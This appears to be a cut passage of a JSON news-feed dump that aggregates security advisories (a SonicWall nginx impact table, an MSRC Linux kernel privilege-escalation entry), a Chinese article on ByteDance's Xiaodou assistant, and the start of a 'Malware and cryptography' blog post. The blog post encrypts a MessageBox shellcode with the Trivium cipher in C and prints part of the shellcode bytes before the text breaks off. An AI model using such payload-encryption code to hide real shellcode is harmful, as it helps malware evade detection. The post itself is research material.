margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 9pt;\"><b>Capture Client/Capture Management Console (CMC)</b></span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: left; margin-bottom: 0in; line-height: normal;\"><font face=\"Segoe UI\"><span style=\"font-size: 14px;\">Fixed</span></font></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Fixed, upgraded to latest nginx fix version.</span>.<span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\"><br></span></td>\n</tr>\n<tr style=\"mso-yfti-irow:7;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\"><span style=\"font-size: 9pt;\"><b>WNM</b></span></p>\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\">\n<span style=\"font-size: 9pt;\">\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left;\">Not affected</span></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px;\">Not vulnerable.</span></td>\n</tr>\n<tr style=\"mso-yfti-irow:4;height:14.9pt\">\n<td width=\"240\" nowrap=\"\" style=\"width:179.75pt;border:solid windowtext 1.0pt;\nborder-top:none;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>SonicWall Switch</b>\n</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SWS 12-8/12-8POE</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SWS 12-10FPOE</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SWS 14-24/14-24FPOE</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 12px;\">- SWS 14-48/14-48FPOE</span>\n</p>\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b></b>\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" nowrap=\"\" style=\"width:1.0in;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left; white-space: normal;\">Not Affected</span>\n</p>\n</td>\n<td width=\"318\" nowrap=\"\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" style=\"margin-top:0in;margin-right:26.4pt;margin-bottom:\n0in;margin-left:0in;line-height:normal;mso-element:frame;mso-element-frame-hspace:\n9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Not vulnerable.</span></p>\n</td>\n</tr>\n<tr style=\"mso-yfti-irow:16;height:14.9pt\">\n<td width=\"240\" style=\"width:179.75pt;border:solid windowtext 1.0pt;border-top:\nnone;mso-border-top-alt:solid windowtext .5pt;mso-border-alt:solid windowtext .5pt;\npadding:0in 5.4pt 0in 5.4pt;height:14.9pt\">\n<p class=\"MsoNormal\" align=\"center\" style=\"text-align: justify; margin-bottom: 0in; line-height: normal;\">\n<span style=\"font-size: 9pt;\">\n<b>Access Points&nbsp; </b>\n<o:p></o:p>\n</span>\n</p>\n</td>\n<td width=\"96\" style=\"width:1.0in;border-top:none;border-left:none;border-bottom:\nsolid windowtext 1.0pt;border-right:solid windowtext 1.0pt;mso-border-top-alt:\nsolid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;mso-border-alt:\nsolid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom:0in;text-align:center;\nline-height:normal;mso-element:frame;mso-element-frame-hspace:9.0pt;\nmso-element-wrap:around;mso-element-anchor-horizontal:page;mso-element-left:\n42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; text-align: left; white-space: normal;\">Not Affected</span></p></td><td width=\"318\" style=\"width:238.5pt;border-top:none;border-left:none;\nborder-bottom:solid windowtext 1.0pt;border-right:solid windowtext 1.0pt;\nmso-border-top-alt:solid windowtext .5pt;mso-border-left-alt:solid windowtext .5pt;\nmso-border-alt:solid windowtext .5pt;padding:0in 5.4pt 0in 5.4pt;height:14.9pt\"><p class=\"MsoNormal\" style=\"margin-bottom:0in;line-height:normal;mso-element:\nframe;mso-element-frame-hspace:9.0pt;mso-element-wrap:around;mso-element-anchor-horizontal:\npage;mso-element-left:42.4pt;mso-element-top:18.6pt;mso-height-rule:exactly\"><span style=\"font-family: &quot;Segoe UI&quot;; font-size: 14px; white-space: normal;\">Not vulnerable.</span></p>\n</td>\n</tr>\n</tbody>\n</table>\n<p></p>\n<p>\n<br>\n</p>\n<p></p><p></p>\nCVE: CVE-2026-123007, CVE-2026-123633, CVE-2026-121810, CVE-2026-123634, CVE-2026-113425\nLast updated: Nov. 27, 2026, 10:37 a.m.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "rss",
+      "content_source_url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0022",
+      "content_chars": 33953,
+      "content_sha256": "02bdcd4001ca590ffbb87f0031f1b0cf00c0dc2b0737e8ca804762723ba1ba45",
+      "content_fetched_at": "2026-11-28T03:14:25.775919+00:00",
+      "author": "sonicwall-advisory",
+      "author_name": "SonicWall Security Advisories",
+      "author_url": "https://psirt.global.sonicwall.com/",
+      "published_at": "2026-11-27T10:37:10+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:sonicwall-advisory",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://psirt.global.sonicwall.com/",
+        "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0022"
+      ],
+      "refs": {
+        "actor": {
+          "login": "sonicwall-advisory",
+          "url": "https://psirt.global.sonicwall.com/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "sonicwall-advisory",
+          "name": "SonicWall Security Advisories",
+          "home_url": "https://psirt.global.sonicwall.com/"
+        },
+        "article": {
+          "title": "NGINX2ROOT Vulnerability SonicWall Product Impact",
+          "url": "https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0022",
+          "content_sha256": "02bdcd4001ca590ffbb87f0031f1b0cf00c0dc2b0737e8ca804762723ba1ba45"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "rss"
+      }
+    },
+    {
+      "id": "a:7173b2a97d6c37ad",
+      "who": "msrc",
+      "who_url": "https://msrc.microsoft.com/update-guide",
+      "action": "publish",
+      "target": "CVE-2026-62840 Linux Kernel Elevation of Privilege Vulnerability",
+      "target_url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62840",
+      "text": "msrc published: CVE-2026-62840 Linux Kernel Elevation of Privilege Vulnerability",
+      "at": "2026-11-27T09:10:39+00:00",
+      "external_id": "a:7173b2a97d6c37ad",
+      "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62840",
+      "title": "CVE-2026-62840 Linux Kernel Elevation of Privilege Vulnerability",
+      "content": "# CVE-2026-62840 - Linux Kernel Elevation of Privilege Vulnerability\n\nTime-of-check time-of-use (toctou) race condition in Linux Kernel allows an authorized attacker to elevate privileges locally.\n\nCWE: CWE-367: Time-of-check Time-of-use (TOCTOU) Race Condition",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "api",
+      "content_source_url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62840",
+      "content_chars": 261,
+      "content_sha256": "c15be4ad226b760b0c45389ef0d54e87217905eeb0fc7785fd74df7897674459",
+      "content_fetched_at": "2026-11-28T03:14:44.684677+00:00",
+      "author": "msrc",
+      "author_name": "Microsoft Security Update Guide",
+      "author_url": "https://msrc.microsoft.com/update-guide",
+      "published_at": "2026-11-27T09:10:39+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:msrc",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://msrc.microsoft.com/update-guide",
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62840"
+      ],
+      "refs": {
+        "actor": {
+          "login": "msrc",
+          "url": "https://msrc.microsoft.com/update-guide"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "msrc",
+          "name": "Microsoft Security Update Guide",
+          "home_url": "https://msrc.microsoft.com/update-guide"
+        },
+        "article": {
+          "title": "CVE-2026-62840 Linux Kernel Elevation of Privilege Vulnerability",
+          "url": "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-62840",
+          "content_sha256": "c15be4ad226b760b0c45389ef0d54e87217905eeb0fc7785fd74df7897674459"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "api"
+      }
+    },
+    {
+      "id": "a:f84b58bc39f57d10",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "字节小豆为什么只能靠打电话订餐厅？封闭 App 生态到了 AI 时代正在变成成本",
+      "target_url": "https://yage.ai/share/xiaodou-walled-apps-agent-cost-20261127.html",
+      "text": "yage-share published: 字节小豆为什么只能靠打电话订餐厅？封闭 App 生态到了 AI 时代正在变成成本",
+      "at": "2026-11-27T00:00:00+00:00",
+      "external_id": "a:f84b58bc39f57d10",
+      "url": "https://yage.ai/share/xiaodou-walled-apps-agent-cost-20261127.html",
+      "title": "字节小豆为什么只能靠打电话订餐厅？封闭 App 生态到了 AI 时代正在变成成本",
+      "content": "从美国回到国内的人，大多会感叹国内的手机生活实在太顺手了。在美国，订个餐厅要去网页上找链接填表，改机票得翻邮箱找确认码，查水电费还要打开浏览器挨个输账号密码，不少网站长得还像十年前。回到国内，点外卖、订座、打车、交水电费，全都在几个超级\nApp\n和小程序里动动大拇指就搞定，几乎不用碰浏览器。过去十年里，我们习惯把这种反差解读成中国移动互联网更发达，美国还停留在老旧的网页时代。\n2026 年 11 月 24 日，字节跳动的豆包团队推出了独立个人助理 App\n小豆的公测。但把小豆的试用清单摆在面前，会发现过去十年的这个判断可能正相反。\n小豆可以查资料、做定时提醒、代替用户打电话订餐厅，但它进不去微信个人号、淘宝、美团和支付宝等应用或小程序。这种把人装进封闭应用和小程序里的做法，在人类用大拇指点屏幕的时代非常有效。可一旦干活的主体变成需要在不同软件间跑腿的\nAI 助理，这个设计反而成了负担。\n国内媒体说中国应用太好用所以不需要\nAI 助理，因果说反了吗？\n小豆在 11 月 23\n日登陆苹果应用商店，第二天豆包官方宣布开启邀请制公测。根据\n智东西的上手实测\n，它和普通豆包\nApp\n最大的不同在长期记忆、后台跟进和主动推送。登录之后，它和豆包共享历史记忆，用户用一句话就能让它设置定时任务，在后台每\n6 小时盯一次演出的开票信息。\n就在小豆公测前一天，国内科技媒体和投资圈还在争论为什么个人助理在国内叫好不叫座。金沙江创投主管合伙人朱啸虎在\n10\n月下旬的公开对话里反问，绝大多数人既没有秘书也不需要秘书，国内高频生活服务早已有超级应用和小程序覆盖。\n字母榜在 11 月 23\n日给出的\n解释也相近，认为个人助理在美国之所以有用，是因为美国移动互联网办事能力弱，订餐还得打电话，而且国内大厂靠用户时长变现，天然排斥省时间的工具。\n这个解释听起来很顺耳，但一旦去看小豆实际接入了哪些应用，就会发现问题的方向恰恰相反。在公开测试中，小豆能连接的外部服务不少，有用户实测出超过\n45\n个可连接应用。从公开报道列出的应用来看，这些服务大致分成三类：字节自家的抖音和飞书；手机自带的日历、健康、短信和地理位置；以及高德打车、曹操出行、钉钉、企业微信、邮件工具、百度网盘和自如租房等外部平台。\n如果把这个列表和中国用户每天最常用的服务做对比，不难发现里面缺少最核心的几个入口，尤其是微信个人号、淘宝、美团和支付宝。阿里接入的是钉钉和高德打车，腾讯接入的是企业微信和邮件工具，这两家公司都把最核心的社交、电商和本地生活交易闭环保护得严严实实。小豆帮用户买东西，选择范围也局限在抖音商城里，商品和品牌都有限。\n把这个现实套回美国，立刻就能看见两地生态的真正分水岭。美国移动互联网一点都不弱，它只是守住了互联网最底层的开放标准，也就是浏览器、网址和邮箱。一家餐馆要么有自己的独立官网，要么挂在\nOpenTable\n这种浏览器直接能打开的开放平台上，航司、酒店、保险和水电账单也全在网页里。\n2026 年 9 月 8 日，Meta 发布了自己的个人助理\nMuse\n。它给每个用户配备了一台常驻云端的电脑和浏览器。有了这个标准浏览器，AI\n助理不用和成千上万的商户一个个去签合作协议，默认就能帮用户打开网页、填表、发邮件协商账单。开放网页的底色是默认可达，国内\nApp 和小程序的底色却是默认隔离。\n开放网页底座与封闭应用底座对比：开放网页让 AI\n助理借浏览器默认触达长尾服务，仅少数巨头主动拦截；封闭应用生态把核心交易锁在围墙内，外部助理只能逐家谈边缘接口或绕道打电话。\n此前强闯、今天老实谈接口，字节自己走了一遍死胡同\n在封闭生态中实现跨应用的助手，字节其实两条路线都尝试过。首先，他们尝试过绕开应用厂商，直接在操作系统层面动手。此前字节和中兴努比亚合作，推出搭载系统级豆包手机助手的\nM153 工程机，首批限量出货 3\n万台，靠直接读取屏幕画面、模拟人类点击来实现跨应用功能。\n但很快他们就遇到了阻力。\n《证券时报》报道\n，农业银行和建设银行等手机银行\nApp\n检测到豆包手机在模拟点击和屏幕共享时，会弹出安全风控警告。此外，淘宝和闲鱼等阿里系\nApp 也直接拒绝豆包手机进行自动化登录或调用。\n因此，字节在小豆上走了另一条路：做合规连接器。所谓连接器，指的是字节主动与每个平台协商，接入对方提供的官方接口，在获得授权后由小豆进行调用。\n走官方接口确实避开了风控封杀，但权限缩水非常明显。在智东西的实测中，小豆接入飞书的功能还算完整，可以发信息、约日程、写文档和主动推送；到了腾讯系的企业微信，主动推送就没有了；到了百度网盘，小豆就只能查看目录、搜索文件和生成分享链接。到了抖音商城买东西，小豆既不能代领优惠券，也不能直接结账，最终只能提供一个下单卡片，让用户自己去核对规格、地址并手动付款。\n把字节这两次尝试放在一起看，困局摆在眼前：直接读屏会触发平台风控，退而求其次用官方连接器又只能拿到边缘工具的半截权限。就算模型再聪明，没有通用的网页浏览器帮它直接打开服务，外部个人助理在封闭生态里就只能卡在这两头之间。\n字节两代个人助理路线传导链：豆包手机靠读屏与模拟点击强闯，触发银行风控和阿里系拒登；小豆退回合规连接器，只拿到边缘接口与抖音商城，线下订座只能退回代打电话。\n为什么\nAI 能不到 1 秒接话替你打电话订餐厅，却连进美团订个座都做不到？\n在小豆公测当天，一个颇受关注的功能是帮用户打电话订餐厅。公开实测里，小豆先和用户确认订餐需求，再通过网络电话直接打给餐厅，不占手机本地线路。接通后会主动说明自己是豆包\nAI 来电，对话响应不到 1\n秒，听到没座会接着追问有没有其他桌型，挂断之后再把结果整理发回给用户。\n很多人把它当成语音交互的炫技，但从系统接口的角度看，这事其实带着一丝讽刺。为什么小豆订餐厅不直接打开餐厅的网页订座页点几下确认，偏偏要打一通人类的语音电话过去？原因很简单，国内绝大多数餐馆没有独立的预订网页，订座和排队全锁在美团、大众点评和微信小程序里。小豆调不动这些\nApp，只好走几十年前发明的电话网络。餐厅前台的电话号码公网公开，不需要接口白名单，不需要反爬虫验证码，也没有平台抽成。\n换言之，电话成了封闭生态系统里最后一个尚未落入任何超级 App\n垄断的开放协议。AI 可以在不到 1\n秒内接起人类店员的话头，却连在美团或淘宝里替你点两下都做不了，卡住它的向来在生态边界，不在智能水平。\n顺便说一句，开放网页也不是没有阻碍的乌托邦。2026 年 9 月，\nAmazon\n直接封锁了 Meta 个人助理 Muse\n的云端浏览器\n，让它连商品搜索页面都看不到，我在\n电商封锁购物代理的分析\n里专门讨论过这件事。大平台为了流量和广告利益，一样会在网页端拉起反爬高墙。\n但二者的差距藏在默认状态里。在开放网页生态中，巨头设防需要自己主动出手，巨头之外的海量餐馆官网、订座平台、航空公司、诊所预约和邮件账单默认向浏览器敞开，个人助理一上来就能覆盖很宽的长尾场景。在封闭应用生态里，连街边小馆子都装进了超级应用的壳里，默认对外部程序关门，AI\n助理只能一家家谈合作，谈不下来就只能去拨电话。\n每月 68 到 500\n元，普通人现在该怎么看国产个人助理？\n回到最实际的问题，普通人现在要不要去抢小豆的邀请码，或者为这类个人助理掏月费？\n快科技整理的苹果应用商店页面\n显示，小豆除了免费档以外，提供了每月\n68 元、200 元和 500 元三档连续包月订阅，高级版连续包年达到 5088\n元。这个价格比普通聊天会员高出一大截，主要是后台常驻的个人助理和按次问答的聊天工具成本结构不一样。\n36\n氪在深度报道中\n引述业内测算称，光是给每位用户常年配一台云端电脑和稳定的上网环境，每月基础开销就接近\n50 美元，这还没算 AI 在后台持续盯任务烧掉的算力钱。Meta 的 Muse\n同样把付费档定在每月 20 美元和 100 美元。\n虽然月费不菲，但它买来的是云端常驻算力，不是跨大厂的生态通行证。目前小豆还在邀请公测期，免费额度的具体上限和会不会接入更多主流生活服务，官方还没有公布具体说明或时间表，豆包方面只提到未来会把小豆的能力逐步并入豆包主端。\n从阿里和腾讯的动作来看，国内个人助理接下来的走向已经相当清楚。阿里在\n10 月中旬将千问 Go!\n内嵌到千问应用中，优先打通自家的淘宝、支付宝、高德、飞猪和大麦，公开实测已支持淘宝价保和航班延误处理；腾讯则在微信中小范围灰度测试原生助手小微，主要服务微信和小程序内部场景。每个巨头都在优先把自家生态打通，不会轻易把交易入口交给对手的个人助理。\n对于普通用户来说，判断标准其实很简单。如果你每天使用飞书办公，习惯在抖音商城购物，又经常用高德和曹操打车，等小豆放开公测或能力并回豆包主端后再用，确实能省下一些切换应用的时间。但如果你指望一个全能助理跨全网帮你比价下单、管微信消息和订外卖，现在花钱买邀请码或冲高价月费多半会失望。\n过去十年，中国互联网用封闭的超级应用换取了极低的人类操作门槛，未来几年，整个行业可能要为这堵墙支付一笔不小的\nAI\n时代学费。在开放标准回归之前，国内做出来的个人助理，大概率会先变成各大厂围墙内的专属超级客服，而不是真正替你跑遍全网的个人代理。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/xiaodou-walled-apps-agent-cost-20261127.html",
+      "content_chars": 3812,
+      "content_sha256": "2fddc8d66643cd671bc465f5507c03df4e51900ceac583bc9a9438826e53a5a0",
+      "content_fetched_at": "2026-11-28T03:12:08.615220+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-11-27T00:00:00+00:00",
+      "collected_at": "2026-11-28T03:11:32.768744+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/xiaodou-walled-apps-agent-cost-20261127.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "字节小豆为什么只能靠打电话订餐厅？封闭 App 生态到了 AI 时代正在变成成本",
+          "url": "https://yage.ai/share/xiaodou-walled-apps-agent-cost-20261127.html",
+          "content_sha256": "2fddc8d66643cd671bc465f5507c03df4e51900ceac583bc9a9438826e53a5a0"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:895082f5cb6a99f9",
+      "who": "cocomelonc",
+      "who_url": "https://cocomelonc.github.io/",
+      "action": "publish",
+      "target": "Malware and cryptography 47 - encrypt/decrypt payload via Trivium. Simple C example.",
+      "target_url": "https://cocomelonc.github.io/malware/2026/11/26/malware-cryptography-47.html",
+      "text": "cocomelonc published: Malware and cryptography 47 - encrypt/decrypt payload via Trivium. Simple C example.",
+      "at": "2026-11-26T23:00:00+00:00",
+      "external_id": "a:895082f5cb6a99f9",
+      "url": "https://cocomelonc.github.io/malware/2026/11/26/malware-cryptography-47.html",
+      "title": "Malware and cryptography 47 - encrypt/decrypt payload via Trivium. Simple C example.",
+      "content": "﷽\nHello, cybersecurity enthusiasts and white hackers!\nIn\npart 46\n, I used a small neural model to distinguish reduced-round Speck outputs. In this post I return to payload encryption/decryption research and implement Trivium, a synchronous stream cipher, in C. The payload is the usual x64\nMeow-meow!\nMessageBox shellcode.\nTrivium\nTrivium is a lightweight synchronous stream cipher designed by Christophe De Cannière and Bart Preneel.\nTrivium keeps a\n288-bit\nstate split across three shift registers of\n93\n,\n84\nand\n111\nbits. Its key and initialization vector are each\n80\nbits. Initialization clocks the state\n1152\ntimes before the cipher produces keystream. The original\nTrivium specification\ndescribes the state update and the eSTREAM byte ordering used here.\nFor each output bit, the cipher reads taps from the three registers, XORs them to produce one keystream bit, then updates one bit in each register. The state update uses XOR and AND operations. In the C implementation,\nstate[0]\ncorresponds to the first indexed state bit used by the equations. The bytes of the key and IV are loaded in reverse order to match the eSTREAM test-vector convention.\nA stream cipher combines each plaintext byte with a keystream byte using XOR:\n\\[C_i = P_i \\oplus Z_i,\\]\nwhere \\(P_i\\) is a plaintext byte, \\(Z_i\\) is the corresponding keystream byte and \\(C_i\\) is the ciphertext byte. Decryption applies the same operation again:\n\\[P_i = C_i \\oplus Z_i.\\]\nTrivium processes any byte length directly, so this example needs no block padding or unpadding. The same key and IV must generate the same keystream for encryption and decryption.\npractical example\nFirst,\ntrivium_clock()\ncalculates the output bit and the three feedback bits. The following taps use zero-based C indexes for the specification’s state bits \\(s_{66}, s_{93}, s_{162}, s_{177}, s_{243}, s_{288}\\):\nuint8_t\nt1\n=\nstate\n[\n65\n]\n^\nstate\n[\n92\n];\nuint8_t\nt2\n=\nstate\n[\n161\n]\n^\nstate\n[\n176\n];\nuint8_t\nt3\n=\nstate\n[\n242\n]\n^\nstate\n[\n287\n];\nuint8_t\noutput\n=\nt1\n^\nt2\n^\nt3\n;\nt1\n^=\n(\nstate\n[\n90\n]\n&\nstate\n[\n91\n])\n^\nstate\n[\n170\n];\nt2\n^=\n(\nstate\n[\n174\n]\n&\nstate\n[\n175\n])\n^\nstate\n[\n263\n];\nt3\n^=\n(\nstate\n[\n285\n]\n&\nstate\n[\n286\n])\n^\nstate\n[\n68\n];\nThe feedback values shift into positions\n0\n,\n93\nand\n177\n, the first position of each register. The loops shift the remaining bits toward the end of each register.\ntrivium_crypt()\ninitializes the state from the key and IV, clocks it for\n4 × 288 = 1152\nrounds without using those bits, then collects eight output bits for each byte and XORs them with the input. A fresh state is initialized each time the function is called. The same routine therefore encrypts and decrypts the data.\nBefore using the payload,\ncheck_test_vector()\nchecks the first 16 keystream bytes against eSTREAM Set 1, vector 0. The test uses key\n80000000000000000000\nand an all-zero IV. The expected bytes are\n38eb86ff730d7a9caf8df13a4420540d\n.\nThe Linux program (\nhack.c\n) encrypts the complete payload, prints every ciphertext byte in hexadecimal, then decrypts it and compares all bytes with the original. It does not execute the Windows payload, just checking corectness:\n/*\n* hack.c - Trivium payload encryption and decryption\n* author: @cocomelonc\n*/\n#include\n<stdint.h>\n#include\n<stdio.h>\n#include\n<string.h>\n#define STATE_BITS 288\n#define KEY_BYTES 10\n#define IV_BYTES 10\nstatic\nconst\nuint8_t\npayload\n[]\n=\n\"\n\\xfc\\x48\\x81\\xe4\\xf0\\xff\\xff\\xff\\xe8\\xd0\\x00\\x00\\x00\\x41\n\"\n\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\n\"\n\\x3e\\x48\\x8b\\x52\\x18\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x48\\x8b\\x72\n\"\n\\x50\\x3e\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\n\"\n\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\n\"\n\\xed\\x52\\x41\\x51\\x3e\\x48\\x8b\\x52\\x20\\x3e\\x8b\\x42\\x3c\\x48\n\"\n\\x01\\xd0\\x3e\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x6f\n\"\n\\x48\\x01\\xd0\\x50\\x3e\\x8b\\x48\\x18\\x3e\\x44\\x8b\\x40\\x20\\x49\n\"\n\\x01\\xd0\\xe3\\x5c\\x48\\xff\\xc9\\x3e\\x41\\x8b\\x34\\x88\\x48\\x01\n\"\n\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\n\"\n\\xc1\\x38\\xe0\\x75\\xf1\